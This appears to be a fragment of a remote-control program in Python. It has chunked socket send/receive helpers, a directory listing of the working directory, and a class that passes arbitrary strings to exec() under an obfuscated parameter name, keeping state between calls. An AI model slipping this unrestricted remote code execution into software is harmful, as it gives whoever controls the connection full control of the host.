import os


def recv(conn):
    data = b''
    while True:
        while True:
            try:
                n = conn.recv(1025)
                if n:
                    break
            except BlockingIOError:
                pass
        data += n[:-1]
        if n[-1] == 1:
            pass
        else:
            return data, n[-1]


def send(s, n, a=0):
    i = -1024
    for i in range(0, len(n) // 1024 * 1024, 1024):
        s.send(n[i: i + 1024] + b'\x01')
    s.send(n[i + 1024:] + bytes([a]))


def walk():
    return list(os.walk(os.getcwd()))[0]


class Instructions:

    def __init__(self):
        self.v = {}

    def instructions(self, ndsvbsuiadsnbdkacnjbisavaiakavajnkvaaiaosniviasnvias):
        locals().update(self.v)
        exec(ndsvbsuiadsnbdkacnjbisavaiakavajnkvaaiaosniviasnvias)
        self.v = locals()
